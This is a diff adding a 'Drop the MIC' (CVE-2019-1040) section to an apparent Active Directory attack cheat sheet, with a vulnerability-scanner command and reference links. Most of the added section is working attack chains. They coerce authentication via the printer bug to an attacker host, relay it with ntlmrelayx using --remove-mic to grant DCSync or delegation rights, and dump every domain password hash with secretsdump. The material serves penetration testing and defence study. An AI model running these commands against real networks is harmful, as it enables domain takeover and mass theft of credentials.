@@ -25,6 +25,7 @@
   * [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
     * [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
     * [SMB Signing Disabled](#smb-signing-disabled)
+    * [Drop the MIC](#drop-the-mic)
   * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
   * [Trust relationship between domains](#trust-relationship-between-domains)
   * [Unconstrained delegation](#unconstrained-delegation)
@@ -716,6 +717,37 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     $ proxychains mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth
     ```
 
+#### Drop the MIC
+
+> The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP
+
+Check vulnerability with [cve-2019-1040-scanner](https://github.com/fox-it/cve-2019-1040-scanner)
+
+```powershell
+python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
+[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
+[*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)
+```
+
+- Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD
+    ```powershell
+    TERM1> python printerbug.py testsegment.local/testuser@s2012exc.testsegment.local <attacker ip/hostname>
+    TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
+    TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
+    ```
+
+
+- Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.
+    ```powershell
+    # create a new machine account
+    TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
+    TERM2> python printerbug.py relaytest.local/testuser@second-dc-server 10.0.2.6
+    TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME
+
+    # connect using the ticket
+    export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
+    secretsdump.py -k -no-pass second-dc-server.local -just-dc
+    ```
 
 ### Dangerous Built-in Groups Usage
 
@@ -1096,3 +1128,5 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
 * [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
 * [Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon](https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf)
 * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
+* [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
+* [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
